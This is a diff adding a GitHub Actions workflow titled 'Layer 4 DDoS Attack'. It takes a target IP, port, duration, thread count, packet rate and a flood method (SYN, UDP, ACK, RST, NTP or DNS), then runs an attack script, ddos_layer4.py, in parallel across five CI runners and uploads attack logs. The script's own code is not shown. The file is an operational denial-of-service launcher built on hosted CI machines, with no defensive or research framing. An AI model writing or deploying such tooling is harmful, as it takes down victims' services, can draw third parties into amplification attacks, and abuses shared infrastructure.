@@ -1,0 +1,73 @@
+name: Layer 4 DDoS Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target IP address'
+        required: true
+        default: '192.168.1.1'
+      port:
+        description: 'Target port'
+        required: true
+        default: '80'
+      duration:
+        description: 'Attack duration in seconds'
+        required: true
+        default: '60'
+      threads:
+        description: 'Number of threads'
+        required: true
+        default: '500'
+      pps:
+        description: 'Packets per second per thread'
+        required: true
+        default: '1000'
+      method:
+        description: 'Attack method (SYN, UDP, ACK, RST, NTP, DNS)'
+        required: true
+        default: 'SYN'
+        type: choice
+        options:
+        - SYN
+        - UDP
+        - ACK
+        - RST
+        - NTP
+        - DNS
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+        
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+        
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        
+    - name: Run attack
+      env:
+        TARGET: ${{ github.event.inputs.target }}
+        PORT: ${{ github.event.inputs.port }}
+        DURATION: ${{ github.event.inputs.duration }}
+        THREADS: ${{ github.event.inputs.threads }}
+        PPS: ${{ github.event.inputs.pps }}
+        METHOD: ${{ github.event.inputs.method }}
+      run: python ddos_layer4.py
+      
+    - name: Upload logs
+      uses: actions/upload-artifact@v3
+      with:
+        name: attack-logs-${{ matrix.instance }}
+        path: attack_logs.txt
